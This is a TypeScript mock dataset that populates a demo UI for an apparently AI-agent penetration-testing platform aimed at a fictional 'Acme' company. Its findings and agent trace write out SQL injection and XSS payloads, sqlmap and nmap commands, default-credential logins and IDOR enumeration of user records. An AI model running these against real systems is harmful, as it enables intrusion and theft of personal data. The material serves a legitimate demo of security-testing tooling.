// Rich mock dataset for the Vercel demo (NEXT_PUBLIC_MOCK=1). Shapes track the
// current backend contract in lib/api.ts + lib/types.ts. All data is static and
// self-consistent (one company "Acme", a few tasks, findings, exploration graph,
// sessions/activity, traffic, agents, etc.) so every page looks populated.

import type {
  Activity, Agent, AgentDetail, Asset, Audit, Company, Conversation,
  ConvTokenSummary, DailyTokenBucket, Edge, Finding, InterceptApprovalRow,
  InterceptPending, InterceptRule, LLMProfile, MCPServer, MCPTool, PromptVar,
  PromptVersion, Settings, SkillItem, Stats, TaskNode, Task, TokenTotal,
  TokenUsage, Tool, TrafficResp, TrafficDetail,
} from "@/lib/types";

const T = (iso: string) => iso; // readability helper for timestamps

// ── Tasks ──────────────────────────────────────────────────────────────────
export const ACTIVE_TASK = "t-acme-web";

export const tasks: Task[] = [
  {
    id: "t-acme-web",
    description: "External penetration test of the Acme public site and admin backend (acme.com)",
    goal: "Obtain admin access to acme.com and confirm that user-sensitive data can be read.",
    status: "running",
    created_at: T("2026-07-24T09:12:00Z"),
    created_unix: 1785489120,
    last_activity: T("2026-07-26T03:58:22Z"),
    last_activity_unix: 1785643102,
    paused: false, active: true, in_flight: 3, stalled: false,
    goals_total: 5, goals_met: 2, engine_mode: "exploring",
    llm_profile_id: 1,
    tokens: { input_tokens: 1284500, output_tokens: 96320, cache_read_tokens: 890400, cache_write_tokens: 132000 },
  },
  {
    id: "t-acme-api",
    description: "Authorization-bypass and injection testing of api.acme.com",
    goal: "Assess authorization bypass (IDOR) and injection risk on the api.acme.com order and user APIs.",
    status: "running",
    created_at: T("2026-07-25T14:05:00Z"),
    created_unix: 1785592500,
    last_activity: T("2026-07-26T03:40:10Z"),
    last_activity_unix: 1785642010,
    paused: false, active: false, in_flight: 2, stalled: false,
    goals_total: 4, goals_met: 1, engine_mode: "exploring",
    llm_profile_id: 1,
    tokens: { input_tokens: 642300, output_tokens: 51200, cache_read_tokens: 401000, cache_write_tokens: 60000 },
  },
  {
    id: "t-shop-pay",
    description: "shop.acme.com payment and order chain",
    goal: "Assess authorization bypass, amount tampering, and race-condition risk on the payment and order APIs.",
    status: "paused",
    created_at: T("2026-07-22T08:30:00Z"),
    created_unix: 1785313800,
    last_activity: T("2026-07-23T18:40:10Z"),
    last_activity_unix: 1785436810,
    paused: true, active: false, in_flight: 0, stalled: false,
    goals_total: 4, goals_met: 1, engine_mode: "paused",
    llm_profile_id: 2,
    tokens: { input_tokens: 233000, output_tokens: 18700, cache_read_tokens: 120000, cache_write_tokens: 22000 },
  },
  {
    id: "t-vpn-edge",
    description: "External exposure reconnaissance (VPN / perimeter services)",
    goal: "Identify exploitable perimeter services exposed by acme.com.",
    status: "done",
    created_at: T("2026-07-18T08:00:00Z"),
    created_unix: 1784966400,
    completed_at: T("2026-07-20T22:11:00Z"),
    completed_unix: 1785190260,
    last_activity: T("2026-07-20T22:11:00Z"),
    last_activity_unix: 1785190260,
    paused: false, active: false, in_flight: 0, stalled: false,
    goals_total: 3, goals_met: 3, engine_mode: "idle",
    llm_profile_id: 1,
    tokens: { input_tokens: 512000, output_tokens: 40100, cache_read_tokens: 300000, cache_write_tokens: 41000 },
  },
];

export const getTask = (id: string) => tasks.find((t) => t.id === id);

const grandTotal: TokenTotal = tasks.reduce(
  (a, t) => ({
    input_tokens: a.input_tokens + (t.tokens?.input_tokens ?? 0),
    output_tokens: a.output_tokens + (t.tokens?.output_tokens ?? 0),
    cache_read_tokens: a.cache_read_tokens + (t.tokens?.cache_read_tokens ?? 0),
    cache_write_tokens: a.cache_write_tokens + (t.tokens?.cache_write_tokens ?? 0),
  }),
  { input_tokens: 0, output_tokens: 0, cache_read_tokens: 0, cache_write_tokens: 0 },
);

// ── Stats ──────────────────────────────────────────────────────────────────
export function stats(taskId?: string): Stats & { active_task?: unknown } {
  const base: Stats = {
    assets: assets.length,
    engine_mode: "exploring",
    llm_configured: true,
    roe_enabled: true,
    findings_confirmed: findings.filter((f) => f.severity !== "low").length,
  };
  const t = taskId ? getTask(taskId) : getTask(ACTIVE_TASK);
  if (!t) return base;
  return {
    ...base,
    engine_mode: t.engine_mode ?? "idle",
    findings_confirmed: findings.filter((f) => f.task_id === t.id).length,
    active_task: {
      id: t.id, in_flight: t.in_flight, goals_total: t.goals_total,
      goals_met: t.goals_met, engine_mode: t.engine_mode, paused: t.paused,
    },
  };
}

// ── Company + Assets (new unified model) ─────────────────────────────────────
export const companies: Company[] = [
  {
    id: 1, name: "Acme Corp", logo: "",
    asset_count: 18,
    scope: [
      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "Primary domain" },
      { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
      { id: 3, company_id: 1, kind: "ip", net: "198.51.100.20", raw: "198.51.100.20" },
    ],
  },
];

export const assets: Asset[] = [
  { id: 1, type: "root_domain", company_id: 1, task_ids: [1], domain: "acme.com", root_domain: "acme.com", icp: "Beijing ICP 2021xxxx", record_type: "A", record_value: ["203.0.113.10"], last_seen: T("2026-07-26T02:00:00Z") },
  { id: 2, type: "subdomain", company_id: 1, task_ids: [1], domain: "www.acme.com", root_domain: "acme.com", record_type: "CNAME", record_value: "acme.com", last_seen: T("2026-07-26T02:01:00Z") },
  { id: 3, type: "subdomain", company_id: 1, task_ids: [2], domain: "api.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["203.0.113.11"], last_seen: T("2026-07-26T02:02:00Z") },
  { id: 4, type: "subdomain", company_id: 1, task_ids: [3], domain: "shop.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["203.0.113.12"], last_seen: T("2026-07-26T02:03:00Z") },
  { id: 5, type: "subdomain", company_id: 1, task_ids: [4], domain: "vpn.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["198.51.100.20"], last_seen: T("2026-07-20T02:00:00Z") },
  { id: 6, type: "subdomain", company_id: 1, task_ids: [1], domain: "admin.acme.com", root_domain: "acme.com", record_type: "A", record_value: ["203.0.113.10"], last_seen: T("2026-07-26T02:04:00Z") },
  { id: 7, type: "ip", company_id: 1, task_ids: [1, 2], ip: "203.0.113.10", c_segment: "203.0.113.0", open_ports: [{ port: 80, service: "http" }, { port: 443, service: "https" }, { port: 22, service: "ssh" }], last_seen: T("2026-07-26T02:05:00Z") },
  { id: 8, type: "ip", company_id: 1, task_ids: [2], ip: "203.0.113.11", c_segment: "203.0.113.0", open_ports: [{ port: 443, service: "https" }], last_seen: T("2026-07-26T02:06:00Z") },
  { id: 9, type: "ip", company_id: 1, task_ids: [4], ip: "198.51.100.20", c_segment: "198.51.100.0", open_ports: [{ port: 443, service: "https" }, { port: 500, service: " isakmp" }], last_seen: T("2026-07-20T02:00:00Z") },
  { id: 10, type: "service", company_id: 1, task_ids: [1], ip: "203.0.113.10", port: 443, service_type: "https", service_name: "nginx/1.24.0", last_seen: T("2026-07-26T02:07:00Z") },
  { id: 11, type: "service", company_id: 1, task_ids: [4], ip: "198.51.100.20", port: 22, service_type: "ssh", service_name: "OpenSSH 8.9p1", last_seen: T("2026-07-20T02:00:00Z") },
  { id: 12, type: "app", company_id: 1, task_ids: [1], url: "https://www.acme.com", app_name: "Acme Public Site", category: "corp", status_code: 200, content_length: 48213, page_title: "Acme Corp - Corporate Website", technologies: ["Nginx", "React", "Cloudflare"], favicon_mmh3: "-1580860059", last_seen: T("2026-07-26T02:08:00Z") },
  { id: 13, type: "app", company_id: 1, task_ids: [1], url: "https://admin.acme.com", app_name: "Admin Backend", category: "admin", status_code: 200, content_length: 12044, page_title: "Acme Admin Login", technologies: ["Nginx", "Vue", "Element-UI"], last_seen: T("2026-07-26T02:09:00Z") },
  { id: 14, type: "app", company_id: 1, task_ids: [2], url: "https://api.acme.com", app_name: "REST API", category: "api", status_code: 401, content_length: 45, page_title: "", technologies: ["Kong", "Node.js"], last_seen: T("2026-07-26T02:10:00Z") },
  { id: 15, type: "endpoint", company_id: 1, task_ids: [2], url: "https://api.acme.com/v1/orders", method: "GET", status_code: 200, params: [{ name: "id", in: "query" }, { name: "page", in: "query" }], last_seen: T("2026-07-26T02:11:00Z") },
  { id: 16, type: "endpoint", company_id: 1, task_ids: [2], url: "https://api.acme.com/v1/users/me", method: "GET", status_code: 200, last_seen: T("2026-07-26T02:12:00Z") },
  { id: 17, type: "endpoint", company_id: 1, task_ids: [1], url: "https://admin.acme.com/login", method: "POST", status_code: 200, params: [{ name: "username" }, { name: "password" }], last_seen: T("2026-07-26T02:13:00Z") },
  { id: 18, type: "endpoint", company_id: 1, task_ids: [1], url: "https://www.acme.com/search", method: "GET", status_code: 200, params: [{ name: "q", in: "query" }], last_seen: T("2026-07-26T02:14:00Z") },
];

export const assetCounts: Record<string, number> = assets.reduce<Record<string, number>>((m, a) => {
  m[a.type] = (m[a.type] ?? 0) + 1;
  return m;
}, {});

// ── Findings ─────────────────────────────────────────────────────────────────
export const findings: Finding[] = [
  { id: "f-1", vulnclass: "SQL Injection", severity: "high", summary: "Error-based SQL injection in the q parameter of www.acme.com/search", evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- -> returns an MSSQL version error, allowing the database schema to be read.", intent_id: "i-2", task_id: "t-acme-web", task_description: "External penetration test of the Acme public site and admin backend", ts: T("2026-07-26T01:20:00Z") },
  { id: "f-2", vulnclass: "IDOR", severity: "high", summary: "api.acme.com/v1/orders?id= allows reading other users' orders", evidence: "Changing id=1001 to id=1002 returns another user's order (including the shipping address and phone number) without any ownership check.", intent_id: "i-5", task_id: "t-acme-api", task_description: "Authorization-bypass and injection testing of api.acme.com", ts: T("2026-07-26T02:44:00Z") },
  { id: "f-3", vulnclass: "Weak JWT", severity: "high", summary: "API JWT uses a weak key and can be forged by offline brute force", evidence: "HS256 with the key 'secret'; john cracks it in 5 seconds -> any sub claim can be forged for privilege escalation.", task_id: "t-acme-api", task_description: "Authorization-bypass and injection testing of api.acme.com", ts: T("2026-07-26T03:02:00Z") },
  { id: "f-4", vulnclass: "Reflected XSS", severity: "medium", summary: "The search page does not escape the q parameter, resulting in reflected XSS", evidence: "q=<script>alert(document.domain)</script> is echoed verbatim into the result title.", task_id: "t-acme-web", task_description: "External penetration test of the Acme public site and admin backend", ts: T("2026-07-25T22:10:00Z") },
  { id: "f-5", vulnclass: "Exposed .git", severity: "medium", summary: "www.acme.com exposes the .git directory, allowing the source code to be recovered", evidence: "GET /.git/HEAD -> 200; git-dumper recovers the backend source code, including the database connection string in a comment.", task_id: "t-acme-web", task_description: "External penetration test of the Acme public site and admin backend", ts: T("2026-07-25T20:30:00Z") },
  { id: "f-6", vulnclass: "Default Credentials", severity: "high", summary: "Default admin credentials admin/admin123 on admin.acme.com", evidence: "Login succeeds and grants access to the admin backend, where users and orders can be managed.", intent_id: "i-3", task_id: "t-acme-web", task_description: "External penetration test of the Acme public site and admin backend", ts: T("2026-07-26T03:50:00Z") },
  { id: "f-7", vulnclass: "Open Redirect", severity: "low", summary: "The next parameter allows arbitrary redirection after login", evidence: "/login?next=https://evil.example returns a 302 redirect to an external site after login.", task_id: "t-acme-web", task_description: "External penetration test of the Acme public site and admin backend", ts: T("2026-07-25T19:12:00Z") },
  { id: "f-8", vulnclass: "Missing Rate Limit", severity: "medium", summary: "The login endpoint has no rate limit, allowing brute force", evidence: "1000 attempts per minute with no lockout and no CAPTCHA.", task_id: "t-acme-web", task_description: "External penetration test of the Acme public site and admin backend", ts: T("2026-07-25T18:40:00Z") },
  { id: "f-9", vulnclass: "Verbose Error", severity: "low", summary: "API 500 responses return a stack trace, leaking paths and framework versions", evidence: "Triggering a 500 returns a Node.js stack trace that leaks absolute paths and dependency versions.", task_id: "t-acme-api", task_description: "Authorization-bypass and injection testing of api.acme.com", ts: T("2026-07-25T23:05:00Z") },
  { id: "f-10", vulnclass: "Outdated Component", severity: "medium", summary: "shop uses an outdated component with a known RCE", evidence: "Fingerprinting identifies component v2.3.1, which corresponds to the CVE-2024-xxxx deserialization RCE.", task_id: "t-shop-pay", task_description: "shop.acme.com payment and order chain", ts: T("2026-07-23T15:00:00Z") },
];

// ── Exploration graph (active task) ──────────────────────────────────────────
// Current model: the root is a fact/state=origin (rendered as the "start"); the payload is a JSON string,
// goals read `text` and everything else reads `summary`. Structure: root -> goal(spawns) -> intent(spawns) -> fact/finding(yields),
// finding -> goal(proves), hint -> intent(derived_from).
const P = (o: Record<string, string>) => JSON.stringify(o);

export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
  nodes: [
    { id: "root", type: "fact", payload: P({ summary: "Root: external penetration test of acme.com" }), priority: 0, state: "origin", origin: "system", ts: T("2026-07-24T09:12:00Z") },
    // Goals (decomposed by the goals agent)
    { id: "g1", type: "goal", payload: P({ text: "Obtain admin backend access" }), priority: 9, state: "met", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
    { id: "g2", type: "goal", payload: P({ text: "Read user-sensitive data" }), priority: 8, state: "open", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
    // Intents (derived from the goals by the planner)
    { id: "i1", type: "intent", payload: P({ summary: "acme.com subdomain enumeration and port scanning" }), priority: 6, state: "done", origin: "planner", ts: T("2026-07-24T09:20:00Z") },
    { id: "i2", type: "intent", payload: P({ summary: "admin backend default credentials / weak password testing" }), priority: 9, state: "done", origin: "planner", ts: T("2026-07-26T03:30:00Z") },
    { id: "i3", type: "intent", payload: P({ summary: "Enumerate admin backend features and user data APIs" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T03:55:00Z") },
    { id: "i4", type: "intent", payload: P({ summary: "SQL injection probing on the www.acme.com/search page" }), priority: 8, state: "done", origin: "planner", ts: T("2026-07-25T22:00:00Z") },
    { id: "i5", type: "intent", payload: P({ summary: "Authorization-bypass (IDOR) testing on the api.acme.com order API" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T02:30:00Z") },
    // Facts
    { id: "fa1", type: "fact", payload: P({ summary: "Discovered the subdomain admin.acme.com (an Element-UI admin backend)" }), priority: 0, state: "open", origin: "work#1", ts: T("2026-07-24T09:40:00Z") },
    { id: "fa2", type: "fact", payload: P({ summary: "The q parameter on the search page is an error-based injection point (MSSQL)" }), priority: 0, state: "open", origin: "work#4", ts: T("2026-07-25T22:05:00Z") },
    // Findings
    { id: "fi1", type: "finding", payload: P({ summary: "Default admin credentials admin/admin123" }), priority: 0, state: "confirmed", origin: "work#2", ts: T("2026-07-26T03:50:00Z") },
    { id: "fi2", type: "finding", payload: P({ summary: "SQL injection (search q) can read the acme_prod database" }), priority: 0, state: "confirmed", origin: "work#4", ts: T("2026-07-26T01:20:00Z") },
    { id: "fi3", type: "finding", payload: P({ summary: "IDOR: /v1/orders?id= allows reading other users' orders" }), priority: 0, state: "confirmed", origin: "work#5", ts: T("2026-07-26T02:44:00Z") },
    // Hints (injected by the main agent)
    { id: "h1", type: "hint", payload: P({ summary: "The admin backend runs Element-UI, so try the default credential list first" }), priority: 5, state: "consumed", origin: "mainagent", ts: T("2026-07-26T03:20:00Z") },
  ],
  edges: [
    { src: "root", dst: "g1", rel: "spawns" },
    { src: "root", dst: "g2", rel: "spawns" },
    { src: "g1", dst: "i1", rel: "spawns" },
    { src: "g1", dst: "i2", rel: "spawns" },
    { src: "g1", dst: "i3", rel: "spawns" },
    { src: "g2", dst: "i4", rel: "spawns" },
    { src: "g2", dst: "i5", rel: "spawns" },
    { src: "i1", dst: "fa1", rel: "yields" },
    { src: "i4", dst: "fa2", rel: "yields" },
    { src: "i2", dst: "fi1", rel: "yields" },
    { src: "i4", dst: "fi2", rel: "yields" },
    { src: "i5", dst: "fi3", rel: "yields" },
    { src: "fi1", dst: "g1", rel: "proves" },
    { src: "h1", dst: "i2", rel: "derived_from" },
  ],
};

export const intents: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent");
export const frontier: TaskNode[] = explorationGraph.nodes.filter((n) => n.type === "intent" && (n.state === "open" || n.state === "running"));

// ── Activity (execution trace)─────────────────────────────────────────────────────
// Sessions are derived from the intents by the sessions tab (session.id = intent.id); the transcript is the
// activity stream matching that intent_id. planner=worker "planner", main agent=worker "mainagent".
// Each worker session contains the full tool execution chain (tool_use -> tool_result -> ... -> result).
export const activity: Activity[] = [
  // planner
  { seq: 1, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "Round 0 - goal decomposition" },
  { seq: 2, worker: "planner", ts: T("2026-07-24T09:12:30Z"), kind: "thinking", summary: "acme.com is a corporate site with several attack surfaces: the public site (www), the admin backend (admin), the API (api), and the shop (shop). Enumerate the assets first, then pick the high-value targets." },
  { seq: 3, worker: "planner", ts: T("2026-07-24T09:13:00Z"), kind: "text", summary: "Two goals were decomposed: (1) obtain admin backend access and (2) read user-sensitive data. First batch of intents derived: subdomain enumeration, admin credential testing, injection probing, and API authorization bypass." },
  { seq: 4, worker: "planner", ts: T("2026-07-26T03:55:00Z"), kind: "round", summary: "Round 3 - review" },
  { seq: 5, worker: "planner", ts: T("2026-07-26T03:55:10Z"), kind: "text", summary: "The admin backend is compromised (g1 achieved). Continuing with g2: two intents derived - enumerate the admin user APIs and run the API IDOR test - with higher priority." },

  // work#1 - i1 subdomain enumeration and port scanning (done)
  { seq: 10, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:20:00Z"), kind: "thinking", summary: "Start with passive subdomain reconnaissance, then identify ports and services on the live hosts." },
  { seq: 11, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:20:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "t11", summary: "subfinder -d acme.com -silent | httpx -silent -sc -title" },
  { seq: 12, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:22:10Z"), kind: "tool_result", tool: "bash", tool_use_id: "t11", summary: "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin Login\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]", detail: "5 live subdomains, of which admin is the backend login page." },
  { seq: 13, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:23:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t12", summary: "nmap -sV -T4 -p- 203.0.113.10" },
  { seq: 14, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:26:40Z"), kind: "tool_result", tool: "bash", tool_use_id: "t12", summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0", detail: "22/80/443 are open." },
  { seq: 15, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:27:00Z"), kind: "tool_use", tool: "upsert_asset", tool_use_id: "t13", summary: "upsert_asset x 6 (subdomains + services)" },
  { seq: 16, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:27:01Z"), kind: "tool_result", tool: "upsert_asset", tool_use_id: "t13", summary: "6 assets upserted" },
  { seq: 17, worker: "work#1", intent_id: "i1", ts: T("2026-07-24T09:40:00Z"), kind: "result", summary: "Asset reconnaissance complete: the admin backend admin.acme.com was found and written back to the graph.", input_tokens: 96000, output_tokens: 6100, cache_read_tokens: 61000, cache_write_tokens: 9000 },

  // work#2 - i2 admin backend default credentials (done, proves g1)
  { seq: 20, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:31:00Z"), kind: "thinking", summary: "The admin backend runs Element-UI and the login endpoint has neither a CAPTCHA nor rate limiting. Try the default credential list first, then fall back to a dictionary." },
  { seq: 21, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t21", summary: "curl -s -d 'username=admin&password=admin' https://admin.acme.com/login -o /dev/null -w '%{http_code}'" },
  { seq: 22, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "t21", summary: "401", detail: "admin/admin failed." },
  { seq: 23, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "t22", summary: "curl -si -d 'username=admin&password=admin123' https://admin.acme.com/login" },
  { seq: 24, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:32:33Z"), kind: "tool_result", tool: "bash", tool_use_id: "t22", summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ...; HttpOnly\nLocation: /dashboard", detail: "admin/admin123 logged in successfully; the session cookie was obtained." },
  { seq: 25, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:33:10Z"), kind: "tool_use", tool: "bash", tool_use_id: "t23", summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/dashboard | grep -o '<title>[^<]*'" },
  { seq: 26, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:33:12Z"), kind: "tool_result", tool: "bash", tool_use_id: "t23", summary: "<title>Acme Admin - Console", detail: "Confirmed entry into the admin console." },
  { seq: 27, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:34:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t24", summary: "report_finding(Default Credentials, high)" },
  { seq: 28, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:34:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t24", summary: "finding f-6 recorded and linked to goal g1 (proves)" },
  { seq: 29, worker: "work#2", intent_id: "i2", ts: T("2026-07-26T03:50:00Z"), kind: "result", summary: "Default admin credentials confirmed; goal 1 is achieved.", input_tokens: 72000, output_tokens: 4800, cache_read_tokens: 48000, cache_write_tokens: 7200 },

  // work#4 - i4 SQL injection (done)
  { seq: 40, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:01:00Z"), kind: "thinking", summary: "The search?q= result page concatenates q into the title; add a single quote manually and look at the error." },
  { seq: 41, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:02:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t41", summary: "curl -s \"https://www.acme.com/search?q=1'\" | grep -i 'sql\\|syntax'" },
  { seq: 42, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:02:04Z"), kind: "tool_result", tool: "bash", tool_use_id: "t41", summary: "Unclosed quotation mark ... near '1'.", detail: "Signs of error-based injection on MSSQL." },
  { seq: 43, worker: "work#4", intent_id: "i4", ts: T("2026-07-25T22:03:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t42", summary: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs --level 2" },
  { seq: 44, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:18:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t42", summary: "Parameter: q (GET) - error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb", detail: "Injection confirmed; four databases were enumerated." },
  { seq: 45, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:19:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t43", summary: "report_finding(SQL Injection, high)" },
  { seq: 46, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:19:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t43", summary: "finding f-1 recorded" },
  { seq: 47, worker: "work#4", intent_id: "i4", ts: T("2026-07-26T01:20:00Z"), kind: "result", summary: "SQL injection confirmed.", input_tokens: 118000, output_tokens: 7400, cache_read_tokens: 82000, cache_write_tokens: 11000 },

  // work#5 - i5 IDOR (running)
  { seq: 50, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:31:00Z"), kind: "thinking", summary: "/v1/orders?id= uses an auto-incrementing numeric id, a classic IDOR surface. Fetch one of your own orders first, then change the id and see whether another user's order can be read." },
  { seq: 51, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:40:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t51", summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1001" },
  { seq: 52, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:40:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t51", summary: "{ \"order_id\":1001, \"user_id\":42, \"amount\":299 }", detail: "Your own order, as expected." },
  { seq: 53, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:43:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t52", summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1002" },
  { seq: 54, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:43:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t52", summary: "{ \"order_id\":1002, \"user_id\":77, \"amount\":1299, \"phone\":\"138****6021\", \"address\":\"Chaoyang District, Beijing ****\" }", detail: "Read another user's order without authorization (including phone number and address); there is no ownership check." },
  { seq: 55, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:44:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t53", summary: "report_finding(IDOR, high)" },
  { seq: 56, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T02:44:01Z"), kind: "tool_result", tool: "report_finding", tool_use_id: "t53", summary: "finding f-2 recorded" },
  { seq: 57, worker: "work#5", intent_id: "i5", ts: T("2026-07-26T03:58:10Z"), kind: "thinking", summary: "Iterating over the id range to size up how much data is reachable through the bypass (nothing is exported yet, to avoid triggering an interception rule)." },

  // work#3 - i3 admin backend user API enumeration (running)
  { seq: 60, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:56:00Z"), kind: "thinking", summary: "An admin session is already established; enumerate the management APIs and look for an entry point that can bulk-export user-sensitive data (goal 2)." },
  { seq: 61, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:57:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t61", summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/api/users?page=1" },
  { seq: 62, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:57:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t61", summary: "{ \"total\": 12840, \"items\": [ { \"id\":1, \"email\":\"a***@acme.com\", \"phone\":\"139****\" } ] }", detail: "The management API pages through every user (including email and phone number) - about 12,800 records." },
  { seq: 63, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:58:20Z"), kind: "thinking", summary: "Confirmed that a bulk user-data read entry point exists; the export action trips the destructive/exfiltration rule, so an interception approval has been submitted and is awaiting release." },

  // Main agent (human-in-the-loop conversation)
  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "Where is the admin backend, and where do we start?" },
  { seq: 71, worker: "mainagent", ts: T("2026-07-26T03:18:06Z"), kind: "text", summary: "admin.acme.com is an Element-UI admin backend with no CAPTCHA and no rate limiting. Try the default credential list first (admin/admin123), then a dictionary. I have injected a high-priority intent for the work agent." },
  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "We have the admin backend. What is the focus next?" },
  { seq: 73, worker: "mainagent", ts: T("2026-07-26T03:52:08Z"), kind: "text", summary: "Goal 2 is to read user-sensitive data: advance the admin user API enumeration and the API IDOR test in parallel. Note that a bulk export triggers an interception rule, so you will need to approve its release." },
];

export function activityForTask(): Activity[] {
  return activity;
}

// ── Token stats ──────────────────────────────────────────────────────────────
export const tokenWorkers: TokenUsage[] = [
  { worker: "planner", input_tokens: 320000, output_tokens: 24000, cache_read_tokens: 210000, cache_write_tokens: 33000 },
  { worker: "work#1", input_tokens: 288000, output_tokens: 21000, cache_read_tokens: 190000, cache_write_tokens: 28000 },
  { worker: "work#2", input_tokens: 402000, output_tokens: 31000, cache_read_tokens: 280000, cache_write_tokens: 41000 },
  { worker: "work#3", input_tokens: 274500, output_tokens: 20320, cache_read_tokens: 210400, cache_write_tokens: 30000 },
];

export const tokenTotal: TokenTotal = grandTotal;

export const dailyTokens: DailyTokenBucket[] = Array.from({ length: 30 }, (_, i) => {
  const d = new Date("2026-07-26T00:00:00Z");
  d.setUTCDate(d.getUTCDate() - (29 - i));
  const wave = 40000 + Math.round(30000 * Math.abs(Math.sin(i / 3)));
  return {
    date: d.toISOString().slice(0, 10),
    input_tokens: wave, output_tokens: Math.round(wave * 0.08),
    cache_read_tokens: Math.round(wave * 0.7), cache_write_tokens: Math.round(wave * 0.12),
  };
});

export const convTokens: ConvTokenSummary[] = [
  { llm_profile_id: 1, created_at: T("2026-07-25T10:00:00Z"), input_tokens: 42000, output_tokens: 3800, cache_read_tokens: 26000, cache_write_tokens: 5200 },
  { llm_profile_id: 2, created_at: T("2026-07-24T16:00:00Z"), input_tokens: 18000, output_tokens: 1600, cache_read_tokens: 9000, cache_write_tokens: 2100 },
];

// ── Traffic ──────────────────────────────────────────────────────────────────
const exchanges = [
  ["x-1", "www.acme.com", "GET", "https://www.acme.com/", 200, "text/html", 48213],
  ["x-2", "www.acme.com", "GET", "https://www.acme.com/search?q=test", 200, "text/html", 5120],
  ["x-3", "www.acme.com", "GET", "https://www.acme.com/.git/HEAD", 200, "text/plain", 23],
  ["x-4", "admin.acme.com", "GET", "https://admin.acme.com/login", 200, "text/html", 12044],
  ["x-5", "admin.acme.com", "POST", "https://admin.acme.com/login", 302, "text/html", 0],
  ["x-6", "admin.acme.com", "GET", "https://admin.acme.com/dashboard", 200, "text/html", 33120],
  ["x-7", "admin.acme.com", "GET", "https://admin.acme.com/api/users?page=1", 200, "application/json", 8842],
  ["x-8", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1001", 200, "application/json", 640],
  ["x-9", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1002", 200, "application/json", 655],
  ["x-10", "api.acme.com", "GET", "https://api.acme.com/v1/users/me", 200, "application/json", 312],
  ["x-11", "api.acme.com", "GET", "https://api.acme.com/v1/admin", 401, "application/json", 45],
  ["x-12", "shop.acme.com", "GET", "https://shop.acme.com/checkout", 200, "text/html", 21990],
